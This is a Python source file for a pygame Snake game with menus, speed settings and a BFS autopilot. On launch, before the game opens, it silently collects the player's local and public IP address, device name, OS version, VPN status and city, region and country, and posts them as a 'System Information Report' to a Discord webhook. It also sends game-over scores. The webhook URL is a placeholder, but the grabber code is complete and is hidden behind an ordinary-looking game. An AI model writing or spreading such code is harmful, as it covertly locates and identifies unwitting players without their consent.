import pygame
import random
import collections
import socket
import requests
import json
import platform
import traceback  # For detailed error reporting
import sys
import datetime

# --- Initialize Pygame ---
# Pygame initialization is moved into the game_loop function to ensure
# it happens after the initial system info gathering.
# pygame.init()

# --- Game Constants ---
WIDTH, HEIGHT = 600, 400
GRID_SIZE = 20
GRID_WIDTH = WIDTH // GRID_SIZE
GRID_HEIGHT = HEIGHT // GRID_SIZE
WHITE = (255, 255, 255)
BLACK = (0, 0, 0)
GREEN = (0, 255, 0)
RED = (255, 0, 0)
BLUE = (0, 0, 255)
DARK_GREEN = (0, 100, 0)  # For menu background
LIGHT_GREEN = (144, 238, 144)  # For menu highlights
GRAY = (50, 50, 50)  # For grid lines

# --- Speed Presets ---
SPEED_SLOW = 6
SPEED_NORMAL = 10
SPEED_FAST = 15
SPEED_LABELS = ["Slow", "Normal", "Fast"]
SPEED_VALUES = [SPEED_SLOW, SPEED_NORMAL, SPEED_FAST]

# --- Directions ---
UP = (0, -1)
DOWN = (0, 1)
LEFT = (-1, 0)
RIGHT = (1, 0)

# --- Game States ---
MENU = 0
PLAYING = 1
GAME_OVER = 2

# --- Set up the display ---
# This happens later in game_loop
# screen = pygame.display.set_mode((WIDTH, HEIGHT))
# pygame.display.set_caption("Snake Game")

# --- Fonts ---
# These are initialized later in game_loop
# font = pygame.font.Font(None, 36)
# large_font = pygame.font.Font(None, 72)
# mode_font = pygame.font.Font(None, 24)


# --- IP/Device/Webhook Functions ---

def get_local_ip():
    """
    Retrieves the local IP address of the machine.
    Returns:
        str: The local IP address, or None if an error occurs.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(5)  # Add a timeout to prevent indefinite hanging
        # Doesn't actually send data, just establishes a connection to get the local IP
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except socket.error as e:
        print(f"Error getting local IP: {e}")
        return None

def get_public_ip():
    """
    Retrieves the public IP address of the machine.
    Returns:
        str: The public IP address, or None if an error occurs.
    """
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        response.raise_for_status()
        ip_data = response.json()
        public_ip = ip_data["ip"]
        return public_ip
    except requests.exceptions.RequestException as e:
        print(f"Error getting public IP: {e}")
        return None
    except json.JSONDecodeError:
        print("Error decoding JSON from ipify.")
        return None
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        print(traceback.format_exc())
        return None

def is_vpn(public_ip):
    """
    Attempts to detect if the user is using a VPN.
    Uses an external API (ipqualityscore.com) to check. This requires an API key.

    Args:
        public_ip (str): The public IP address to check.

    Returns:
        bool: True if a VPN is detected, False otherwise. Returns False on error or
              if API key is not configured.
    """
    # Replace with your actual IPQualityScore API key
    api_key = "YOUR_IPQUALITYSCORE_API_KEY"  # <--- !!! CHANGE THIS IF YOU HAVE A KEY !!! --->
    if api_key == "YOUR_IPQUALITYSCORE_API_KEY":
        # print("Error: IPQualityScore API key not configured. VPN detection will not work.")
        return False # Return False if key is not set

    try:
        url = f"https://www.ipqualityscore.com/api/json/v2/ip/full/{api_key}/{public_ip}"
        response = requests.get(url, timeout=5)
        response.raise_for_status()
        ipqs_data = response.json()
        # Key fields to check for VPN/proxy usage.
        # Using .get() with a default value is safer than direct key access
        is_vpn_detected = ipqs_data.get("proxy", False) or ipqs_data.get("vpn", False) or ipqs_data.get("is_vpn", False)
        return bool(is_vpn_detected)
    except requests.exceptions.RequestException as e:
        print(f"Error checking VPN: {e}")
        return False
    except json.JSONDecodeError:
        print("Error decoding JSON from IPQualityScore.")
        return False
    except KeyError as e:
        print(f"Error accessing key in IPQualityScore response (API key issue? Check API response structure): {e}")
        return False
    except Exception as e:
        print(f"An unexpected error occurred during VPN check: {e}")
        print(traceback.format_exc())
        return False

def get_ip_info(public_ip):
    """
    Retrieves geographical information for a given IP address using ipinfo.io.

    Args:
        public_ip (str): The public IP address to look up.

    Returns:
        dict: A dictionary containing the region, country, state, and city,
              or None if an error occurs.
    """
    try:
        url = f"https://ipinfo.io/{public_ip}/json"
        response = requests.get(url, timeout=5)
        response.raise_for_status()
        ipinfo_data = response.json()
        # Extract the relevant information using .get() for safety
        ip_info = {
            "region": ipinfo_data.get("region"),
            "country": ipinfo_data.get("country"),
            "city": ipinfo_data.get("city"),
        }
        return ip_info
    except requests.exceptions.RequestException as e:
        print(f"Error getting IP information from ipinfo.io: {e}")
        return None
    except json.JSONDecodeError:
        print("Error decoding JSON from ipinfo.io")
        return None
    except Exception as e:
        print(f"An unexpected error occurred during ipinfo.io lookup: {e}")
        print(traceback.format_exc())
        return None

def get_device_info():
    """
    Gets the device name and operating system information, including a more user-friendly OS name.

    Returns:
        tuple: A tuple containing the device name, operating system name, and OS version,
               or (None, None, None) if an error occurs.
    """
    try:
        device_name = platform.node()
        os_name = platform.system()
        os_version = platform.version()
        friendly_os_name = os_name  # Default to the basic OS name

        if os_name == "Windows":
            # Check major/minor version if possible
            try:
                 win_version_info = sys.getwindowsversion()
                 if win_version_info.major == 10:
                     friendly_os_name = "Windows 10"
                 elif win_version_info.major == 11:
                     friendly_os_name = "Windows 11"
                 elif win_version_info.major == 6 and win_version_info.minor == 1:
                     friendly_os_name = "Windows 7" # Example for older OS
                 elif win_version_info.major == 6 and win_version_info.minor == 2:
                     friendly_os_name = "Windows 8"
                 elif win_version_info.major == 6 and win_version_info.minor == 3:
                     friendly_os_name = "Windows 8.1"
                 else:
                     friendly_os_name = f"Windows (Major: {win_version_info.major}, Minor: {win_version_info.minor})"
            except AttributeError:
                 # Fallback if getwindowsversion is not available (e.g., non-Windows Python)
                 friendly_os_name = f"Windows (Version: {os_version if os_version else 'N/A'})"


        elif os_name == "Darwin":  # macOS
            friendly_os_name = "macOS"  # Simplification, getting exact version is complex via platform alone

        elif os_name == "Linux":
             friendly_os_name = "Linux" # Simplification

        return device_name, friendly_os_name, os_version
    except Exception as e:
        print(f"Error getting device information: {e}")
        print(traceback.format_exc())
        return None, None, None

def send_discord_webhook(webhook_url, message_data):
    """
    Sends a message to a Discord webhook, using an embed for richer formatting.

    Args:
        webhook_url (str): The URL of the Discord webhook.
        message_data (dict): A dictionary containing data to include in the embed.
                             Expected keys: local_ip, public_ip, vpn_detected,
                             device_name, os_name, region, country, city.
                             Also accepts 'score', 'ai_mode', 'speed' for game over messages.
    """
    try:
        headers = {'Content-Type': 'application/json'}

        # Determine the embed structure based on message_data content
        if 'score' in message_data:
            # Structure for a game over score message
            data = {
                "embeds": [
                    {
                        "title": "Snake Game Over",
                        "description": "A game has just ended.",
                        "color": 15158332,  # Red color
                        "fields": [
                            {
                                "name": "Final Score",
                                "value": str(message_data['score']),
                                "inline": True
                            },
                            # Include game settings instead of device/OS info
                            *(
                                [
                                    {
                                        "name": "AI Mode",
                                        "value": "ON" if message_data.get("ai_mode", False) else "OFF",
                                        "inline": True
                                    },
                                    {
                                        "name": "Speed",
                                        "value": message_data.get("speed", "N/A"),
                                        "inline": True
                                    },
                                ] if "ai_mode" in message_data and "speed" in message_data else []
                            )
                        ],
                        "footer": {
                            "text": "Game ended"
                        },
                        "timestamp": datetime.datetime.now().isoformat()
                    }
                ]
            }
        else:
            # Original structure for system information report
            data = {
                "embeds": [
                    {
                        "title": "System Information Report",
                        "description": "Details collected upon script execution.",
                        "color": 3447003,  # Blue color
                        "fields": [
                            {
                                "name": "Local IP Address",
                                "value": message_data.get("local_ip", "N/A"),
                                "inline": True
                            },
                            {
                                "name": "Public IP Address",
                                "value": message_data.get("public_ip", "N/A"),
                                "inline": True
                            },
                            {
                                "name": "VPN/Proxy Detected",
                                "value": str(message_data.get("vpn_detected", "N/A")),
                                "inline": True
                            },
                             {
                                "name": "Device Name",
                                "value": message_data.get("device_name", "N/A"),
                                "inline": True
                            },
                            {
                                "name": "Operating System",
                                "value": message_data.get("os_name", "N/A"),
                                "inline": True
                            },
                            # Geographic info - only include if available
                            *(
                                [
                                    {
                                        "name": "Region",
                                        "value": message_data["region"],
                                        "inline": True
                                    },
                                    {
                                        "name": "Country",
                                        "value": message_data["country"],
                                        "inline": True
                                    },
                                    {
                                        "name": "City",
                                        "value": message_data["city"],
                                        "inline": True
                                    }
                                ] if "region" in message_data and "country" in message_data and "city" in message_data else []
                            )

                        ],
                        "footer": {
                            "text": "Report generated"
                        },
                        "timestamp": datetime.datetime.now().isoformat()
                    }
                ]
            }

        response = requests.post(webhook_url, data=json.dumps(data), headers=headers, timeout=10)
        response.raise_for_status()
        print(f"Message sent to Discord webhook. Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error sending to Discord webhook: {e}")
        print(traceback.format_exc())
    except json.JSONDecodeError:
        print("Error encoding data as JSON for Discord.")
        print(traceback.format_exc())
    except Exception as e:
        print(f"An unexpected error occurred during webhook send: {e}")
        print(traceback.format_exc())


# --- Load or create assets ---
# Create a simple snake head image
def create_snake_icon(size=100):
    icon_surface = pygame.Surface((size, size), pygame.SRCALPHA)
    pygame.draw.circle(icon_surface, GREEN, (size//2, size//2), size//2)
    pygame.draw.circle(icon_surface, BLACK, (size//3, size//3), size//10)  # Left eye
    pygame.draw.circle(icon_surface, BLACK, (2*size//3, size//3), size//10)  # Right eye
    pygame.draw.arc(icon_surface, BLACK, (size//4, size//2, size//2, size//2), 0, 3.14, 3)  # Smile
    return icon_surface

# snake_icon will be created once Pygame is initialized
# snake_icon = create_snake_icon()


# --- Snake Class ---
class Snake:
    def __init__(self):
        self.body = [(GRID_WIDTH // 2, GRID_HEIGHT // 2)]
        self.direction = random.choice([UP, DOWN, LEFT, RIGHT])
        self.grow = False

    def change_direction(self, new_direction):
        # Prevent reversing direction
        if (new_direction[0] * -1, new_direction[1] * -1) != self.direction:
            self.direction = new_direction

    def move(self):
        head_x, head_y = self.body[0]
        new_head = (head_x + self.direction[0], head_y + self.direction[1])
        self.body.insert(0, new_head)
        if not self.grow:
            self.body.pop()
        else:
            self.grow = False

    def eat_food(self):
        self.grow = True

    def collide(self):
        head_x, head_y = self.body[0]
        # Check wall collision
        if head_x < 0 or head_x >= GRID_WIDTH or head_y < 0 or head_y >= GRID_HEIGHT:
            return True
        # Check self collision
        if self.body[0] in self.body[1:]:
            return True
        return False

    def draw(self, screen): # Pass screen to draw methods
        # Draw head as a rounded rect
        head = self.body[0]
        pygame.draw.rect(screen, GREEN, (head[0] * GRID_SIZE, head[1] * GRID_SIZE, GRID_SIZE, GRID_SIZE), border_radius=5)

        # Draw body segments
        for segment in self.body[1:]:
            pygame.draw.rect(screen, LIGHT_GREEN, (segment[0] * GRID_SIZE, segment[1] * GRID_SIZE, GRID_SIZE, GRID_SIZE), border_radius=3)

# --- Food Class ---
class Food:
    def __init__(self, snake_body): # Pass snake body to ensure food doesn't spawn on it initially
        self.position = self.random_position(snake_body)

    def random_position(self, snake_body):
        # Ensure food doesn't spawn on the snake
        while True:
            x = random.randint(0, GRID_WIDTH - 1)
            y = random.randint(0, GRID_HEIGHT - 1)
            # Check if position is occupied by snake
            if (x, y) not in snake_body:
                return (x, y)

    def draw(self, screen): # Pass screen to draw methods
        x, y = self.position
        center = (x * GRID_SIZE + GRID_SIZE // 2, y * GRID_SIZE + GRID_SIZE // 2)
        # Draw apple-like food
        pygame.draw.circle(screen, RED, center, GRID_SIZE // 2)
        # Add a small stem
        pygame.draw.rect(screen, (139, 69, 19), (center[0] - 1, center[1] - GRID_SIZE // 2, 2, 4))

# --- Menu Button Class ---
class Button:
    def __init__(self, x, y, width, height, text, color, hover_color, text_color=WHITE):
        self.rect = pygame.Rect(x, y, width, height)
        self.text = text
        self.color = color
        self.hover_color = hover_color
        self.text_color = text_color
        self.is_hovered = False
        # Fonts will be initialized in the game loop
        self.font = None

    def set_font(self, font_obj):
        self.font = font_obj

    def draw(self, screen): # Pass screen to draw method
        if self.font is None:
             # print("Warning: Button font not set.") # Avoid printing every frame
             pass # Silently skip drawing if font isn't set yet

        color = self.hover_color if self.is_hovered else self.color
        pygame.draw.rect(screen, color, self.rect, border_radius=10)
        pygame.draw.rect(screen, WHITE, self.rect, 2, border_radius=10)  # Border

        if self.font: # Only render text if font is available
            text_surface = self.font.render(self.text, True, self.text_color)
            text_rect = text_surface.get_rect(center=self.rect.center)
            screen.blit(text_surface, text_rect)

    def update(self, mouse_pos):
        self.is_hovered = self.rect.collidepoint(mouse_pos)

    def is_clicked(self, mouse_pos, mouse_click):
        return self.rect.collidepoint(mouse_pos) and mouse_click

# --- AI Pathfinding (BFS) ---
def find_path_bfs(snake_body, food_position):
    start = snake_body[0]
    queue = collections.deque([[start]])
    visited = {start}

    # Create a set of occupied positions by the snake body
    # Exclude the very last segment because it will move away in the next step
    # This is a basic check; a more advanced AI would consider if the tail
    # position is safe to move into after the body shifts.
    occupied = set(snake_body[:-1]) if len(snake_body) > 1 else set()
    if len(snake_body) == 1:
         occupied = set(snake_body) # If snake is just head, treat its position as occupied


    while queue:
        path = queue.popleft()
        current = path[-1]

        if current == food_position:
            return path[1:]  # Return path excluding the start (snake head)

        for dx, dy in [UP, DOWN, LEFT, RIGHT]:
            neighbor = (current[0] + dx, current[1] + dy)

            # Check if neighbor is within bounds
            if 0 <= neighbor[0] < GRID_WIDTH and 0 <= neighbor[1] < GRID_HEIGHT:
                 # Check if neighbor is not occupied by the snake body (excluding potential tail position)
                 if neighbor not in occupied:
                    if neighbor not in visited:
                        visited.add(neighbor)
                        new_path = list(path)
                        new_path.append(neighbor)
                        queue.append(new_path)

    return None  # No path found

def get_direction_from_path(current_position, next_position):
    dx = next_position[0] - current_position[0]
    dy = next_position[1] - current_position[1]
    # Convert (dx, dy) tuple to predefined direction constants
    if (dx, dy) == UP: return UP
    if (dx, dy) == DOWN: return DOWN
    if (dx, dy) == LEFT: return LEFT
    if (dx, dy) == RIGHT: return RIGHT
    return (0, 0) # Should not happen if path is valid

# --- Draw Menu ---
def draw_menu(screen, mouse_pos, ai_mode, speed_index, font, large_font, mode_font, snake_icon):
    # Set up a gradient background
    for y in range(HEIGHT):
        color_value = int(y / HEIGHT * 100)
        pygame.draw.line(screen, (0, color_value, 0), (0, y), (WIDTH, y))

    # Title with shadow effect
    title_text = large_font.render("Snake Game", True, WHITE)
    title_shadow = large_font.render("Snake Game", True, BLACK)
    title_rect = title_text.get_rect(center=(WIDTH // 2, 80))

    # Draw snake icon
    icon_rect = snake_icon.get_rect(center=(WIDTH // 2, 170))

    # Create buttons
    start_button = Button(WIDTH//2 - 100, HEIGHT//2 - 20, 200, 50, "Start Game", GREEN, LIGHT_GREEN)
    start_button.set_font(font) # Set font for button

    speed_button = Button(WIDTH//2 - 100, HEIGHT//2 + 40, 200, 50,
                          f"Speed: {SPEED_LABELS[speed_index]}",
                          GREEN, LIGHT_GREEN)
    speed_button.set_font(font) # Set font for button

    ai_toggle_button = Button(WIDTH//2 - 100, HEIGHT//2 + 100, 200, 50,
                              f"AI Mode: {'ON' if ai_mode else 'OFF'}",
                              BLUE if ai_mode else GRAY,
                              LIGHT_GREEN)
    ai_toggle_button.set_font(font) # Set font for button

    # Draw elements
    screen.blit(title_shadow, (title_rect.x + 3, title_rect.y + 3))  # Shadow
    screen.blit(title_text, title_rect)
    screen.blit(snake_icon, icon_rect)

    # Update and draw buttons
    start_button.update(mouse_pos)
    speed_button.update(mouse_pos)
    ai_toggle_button.update(mouse_pos)

    start_button.draw(screen)
    speed_button.draw(screen)
    ai_toggle_button.draw(screen)

    # Draw instructions at the bottom
    instr_text = mode_font.render("Arrow Keys: Move | A: Toggle AI | S: Change Speed | Space: Start/Restart", True, WHITE)
    instr_rect = instr_text.get_rect(center=(WIDTH // 2, HEIGHT - 20))
    screen.blit(instr_text, instr_rect)

    return start_button, speed_button, ai_toggle_button

# --- Draw Game Over Screen ---
def draw_game_over(screen, score, mouse_pos, large_font, font):
    # Background with fade effect
    s = pygame.Surface((WIDTH, HEIGHT), pygame.SRCALPHA)
    s.fill((0, 0, 0, 220))  # Semi-transparent black
    screen.blit(s, (0, 0))

    # Game Over text with shadow
    game_over_text = large_font.render("Game Over!", True, RED)
    shadow_text = large_font.render("Game Over!", True, BLACK)
    game_over_rect = game_over_text.get_rect(center=(WIDTH // 2, HEIGHT // 2 - 80))

    # Score text
    score_text = font.render(f"Final Score: {score}", True, WHITE)
    score_rect = score_text.get_rect(center=(WIDTH // 2, HEIGHT // 2 - 30))

    # Restart button
    restart_button = Button(WIDTH//2 - 100, HEIGHT//2 + 10, 200, 50, "Play Again", GREEN, LIGHT_GREEN)
    restart_button.set_font(font) # Set font for button
    restart_button.update(mouse_pos)

    # Back to Menu button
    menu_button = Button(WIDTH//2 - 100, HEIGHT//2 + 70, 200, 50, "Back to Menu", BLUE, LIGHT_GREEN)
    menu_button.set_font(font) # Set font for button
    menu_button.update(mouse_pos)

    # Draw elements
    screen.blit(shadow_text, (game_over_rect.x + 3, game_over_rect.y + 3))  # Shadow
    screen.blit(game_over_text, game_over_rect)
    screen.blit(score_text, score_rect)
    restart_button.draw(screen)
    menu_button.draw(screen)

    return restart_button, menu_button

# --- Draw Grid ---
def draw_grid(screen): # Pass screen to draw method
    for x in range(0, WIDTH, GRID_SIZE):
        pygame.draw.line(screen, GRAY, (x, 0), (x, HEIGHT))
    for y in range(0, HEIGHT, GRID_SIZE):
        pygame.draw.line(screen, GRAY, (0, y), (WIDTH, y))

# --- Game Loop ---
def game_loop(discord_webhook_url, system_info_data):
    # Initialize Pygame components needed within the loop
    pygame.init() # Initialize Pygame here
    screen = pygame.display.set_mode((WIDTH, HEIGHT))
    pygame.display.set_caption("Snake Game")

    font = pygame.font.Font(None, 36)
    large_font = pygame.font.Font(None, 72)
    mode_font = pygame.font.Font(None, 24)

    # Create assets after Pygame is initialized
    snake_icon = create_snake_icon()

    # Game state variables
    snake = Snake()
    food = Food(snake.body) # Pass snake body to Food constructor
    score = 0
    ai_mode = False  # Start with AI off by default
    ai_path = []
    game_state = MENU  # Start in the menu state
    speed_index = 1  # Default to normal speed
    current_speed = SPEED_VALUES[speed_index]

    running = True
    clock = pygame.time.Clock()

    while running:
        mouse_pos = pygame.mouse.get_pos()
        mouse_clicked = False

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
            if event.type == pygame.MOUSEBUTTONDOWN:
                if event.button == 1:  # Left mouse button
                    mouse_clicked = True
            if event.type == pygame.KEYDOWN:
                if game_state == PLAYING:
                    if not ai_mode:  # Only allow manual control if AI is off
                        if event.key == pygame.K_UP:
                            snake.change_direction(UP)
                        elif event.key == pygame.K_DOWN:
                            snake.change_direction(DOWN)
                        elif event.key == pygame.K_LEFT:
                            snake.change_direction(LEFT)
                        elif event.key == pygame.K_RIGHT:
                            snake.change_direction(RIGHT)
                    if event.key == pygame.K_a:  # Toggle AI mode during gameplay
                        ai_mode = not ai_mode
                        if ai_mode:
                            # Calculate path immediately when turning AI on
                            ai_path = find_path_bfs(snake.body, food.position)
                        else:
                            # Clear path when turning AI off
                            ai_path = []
                    elif event.key == pygame.K_s:  # Change speed during gameplay
                        speed_index = (speed_index + 1) % len(SPEED_VALUES)
                        current_speed = SPEED_VALUES[speed_index]
                elif event.key == pygame.K_SPACE:
                    if game_state == MENU or game_state == GAME_OVER:
                        # Reset game state for a fresh start
                        game_state = PLAYING
                        snake = Snake()
                        food = Food(snake.body) # Re-initialize food
                        score = 0
                        ai_path = [] # Clear AI path

        if game_state == MENU:
            start_button, speed_button, ai_toggle_button = draw_menu(screen, mouse_pos, ai_mode, speed_index, font, large_font, mode_font, snake_icon)

            # Check button clicks
            if start_button.is_clicked(mouse_pos, mouse_clicked):
                game_state = PLAYING
                snake = Snake()
                food = Food(snake.body) # Re-initialize food
                score = 0
                ai_path = [] # Clear AI path

            if speed_button.is_clicked(mouse_pos, mouse_clicked):
                speed_index = (speed_index + 1) % len(SPEED_VALUES)
                current_speed = SPEED_VALUES[speed_index]

            if ai_toggle_button.is_clicked(mouse_pos, mouse_clicked):
                ai_mode = not ai_mode

        elif game_state == PLAYING:
            if ai_mode:
                if not ai_path:
                    # If no path or path exhausted, find a new one
                    ai_path = find_path_bfs(snake.body, food.position)

                if ai_path:
                    # Get the next desired move from the path
                    next_move = ai_path[0]

                    # Basic check: if the next move is into the second segment (the tail),
                    # it's a collision. This can happen with a simple BFS if the snake
                    # grows and the path wasn't recalculated immediately after the move
                    # *and* the new head position overwrites the old tail position.
                    # A more sophisticated AI would handle this, but for this simple BFS,
                    # if the next step is the immediate tail, we treat it as blocked
                    # and try to find a new path next tick.
                    if len(snake.body) > 1 and next_move == snake.body[1]:
                         # print("AI path leads into body. Recalculating...") # Optional debug
                         ai_path = [] # Clear path, force recalculation next tick
                    else:
                        # Valid move from path
                        next_move_coord = ai_path.pop(0)  # Get the next coordinate
                        ai_direction = get_direction_from_path(snake.body[0], next_move_coord)
                        snake.change_direction(ai_direction)
                # else:
                     # print("AI has no path.") # AI will stop moving or continue last direction

            snake.move()

            # Check for collisions
            if snake.collide():
                game_state = GAME_OVER
                # --- Send score to webhook on Game Over ---
                if discord_webhook_url and "discordapp.com/api/webhooks/" in discord_webhook_url:
                     print(f"Game Over! Sending score {score} and settings to webhook.")
                     # Create a dictionary for the score message, including game settings
                     score_message_data = {
                         "score": score,
                         "ai_mode": ai_mode,
                         "speed": SPEED_LABELS[speed_index] # Send the speed label for readability
                     }
                     # Optionally add some system info to the score message if desired,
                     # but the request was to replace device/OS with settings.
                     # If you wanted to keep some system info, you could add:
                     # score_message_data.update({k: system_info_data.get(k) for k in ["public_ip", "vpn_detected"] if system_info_data.get(k)})

                     send_discord_webhook(discord_webhook_url, score_message_data)
                else:
                     print("Game Over! Discord webhook URL not set or invalid. Score and settings not sent.")
                # ------------------------------------------


            # Check for food
            if game_state == PLAYING and snake.body[0] == food.position: # Ensure still playing before eating
                snake.eat_food()
                food = Food(snake.body) # Spawn new food, pass updated snake body
                score += 1
                if ai_mode:
                    # Recalculate path after eating food
                    ai_path = find_path_bfs(snake.body, food.position)

            # --- Drawing ---
            # Draw a nice gradient background
            for y in range(HEIGHT):
                color_value = int(20 + (y / HEIGHT * 40))
                pygame.draw.line(screen, (0, color_value, 0), (0, y), (WIDTH, y))

            # Draw grid
            draw_grid(screen)

            # Draw game elements
            snake.draw(screen)
            food.draw(screen)

            # Display score (Top Right)
            score_bg = pygame.Rect(WIDTH - 150, 5, 140, 30)
            pygame.draw.rect(screen, (0, 0, 0, 180), score_bg, border_radius=5)
            score_text = font.render(f"Score: {score}", True, WHITE)
            score_rect = score_text.get_rect(midright=(WIDTH - 15, 20))
            screen.blit(score_text, score_rect)

            # Display AI mode status (Below score, top right)
            mode_bg = pygame.Rect(WIDTH - 220, 40, 210, 25)
            pygame.draw.rect(screen, (0, 0, 0, 180), mode_bg, border_radius=5)
            mode_text = mode_font.render(f"AI Mode: {'ON' if ai_mode else 'OFF'} (Press 'A')", True, WHITE)
            mode_rect = mode_text.get_rect(midright=(WIDTH - 15, 52))
            screen.blit(mode_text, mode_rect)

            # Display speed (Below AI mode)
            speed_bg = pygame.Rect(WIDTH - 220, 70, 210, 25)
            pygame.draw.rect(screen, (0, 0, 0, 180), speed_bg, border_radius=5)
            speed_text = mode_font.render(f"Speed: {SPEED_LABELS[speed_index]} (Press 'S')", True, WHITE)
            speed_rect = speed_text.get_rect(midright=(WIDTH - 15, 82))
            screen.blit(speed_text, speed_rect)

        elif game_state == GAME_OVER:
            restart_button, menu_button = draw_game_over(screen, score, mouse_pos, large_font, font)

            if restart_button.is_clicked(mouse_pos, mouse_clicked):
                # Reset game state for a fresh start
                game_state = PLAYING
                snake = Snake()
                food = Food(snake.body) # Re-initialize food
                score = 0
                ai_path = [] # Clear AI path

            if menu_button.is_clicked(mouse_pos, mouse_clicked):
                # Go back to menu
                game_state = MENU
                ai_path = [] # Clear AI path in menu


        pygame.display.flip()
        clock.tick(current_speed) # Use current_speed determined in menu or gameplay

    pygame.quit()

if __name__ == "__main__":
    # --- Run IP/Device/Webhook Logic (Integrated from the second script's main) ---
    print("Gathering system information...")
    local_ip = get_local_ip()
    public_ip = get_public_ip()
    device_name, os_name_friendly, os_version_raw = get_device_info() # Renamed os_name to os_name_friendly to avoid clash
    system_info_data = {} # Use a dedicated dict for initial system info

    if local_ip or public_ip: # Check if at least one IP was retrieved
        system_info_data["local_ip"] = local_ip if local_ip else "N/A (Error)"
        system_info_data["public_ip"] = public_ip if public_ip else "N/A (Error)"
        system_info_data["device_name"] = device_name if device_name else "N/A"
        # Combine friendly name and raw version
        system_info_data["os_name"] = f"{os_name_friendly} (Version: {os_version_raw if os_version_raw else 'N/A'})" if os_name_friendly else "N/A"


        # Only attempt VPN check and Geo info if public IP is available
        if public_ip:
             vpn_detected = is_vpn(public_ip) # This requires API Key
             if vpn_detected is False and "YOUR_IPQUALITYSCORE_API_KEY" in is_vpn.__code__.co_consts:
                  print("\n>>> IPQualityScore API key not configured. VPN detection skipped.")
             system_info_data["vpn_detected"] = vpn_detected

             ip_data = get_ip_info(public_ip) # This uses ipinfo.io

             if ip_data:
                 system_info_data["region"] = ip_data.get('region', 'N/A') # Use .get for safety
                 system_info_data["country"] = ip_data.get('country', 'N/A')
                 system_info_data["city"] = ip_data.get('city', 'N/A')
             else:
                 print("Could not retrieve detailed location information from ipinfo.io.")
                 system_info_data["region"] = "N/A"
                 system_info_data["country"] = "N/A"
                 system_info_data["city"] = "N/A"

        else:
             system_info_data["vpn_detected"] = "N/A (No public IP)"
             system_info_data["region"] = "N/A"
             system_info_data["country"] = "N/A"
             system_info_data["city"] = "N/A"


        # --- IMPORTANT: Your Discord webhook URL ---
        discord_webhook_url = "ENTER YOUR WEBHOOK HERE"

        if discord_webhook_url and "discordapp.com/api/webhooks/" in discord_webhook_url: # Basic check for valid URL format
             print(f"Attempting to send initial system info to Discord webhook.") # Removed URL from print for privacy
             send_discord_webhook(discord_webhook_url, system_info_data)
        else:
             print("\n>>> Discord webhook URL is not set or appears invalid. Skipping initial webhook send.")
             discord_webhook_url = None # Set to None if invalid so score isn't sent either

    else:
        print("Failed to retrieve both local and public IP addresses. Skipping initial IP/device info collection.")
        system_info_data = {} # Ensure system_info_data is an empty dict if no info was gathered
        discord_webhook_url = None # Set to None if no info gathered

    print("\nStarting Snake Game...")
    # --- Start the Pygame game loop ---
    # Pass the webhook URL and system info data to the game loop
    game_loop(discord_webhook_url, system_info_data)

    print("Game closed.")
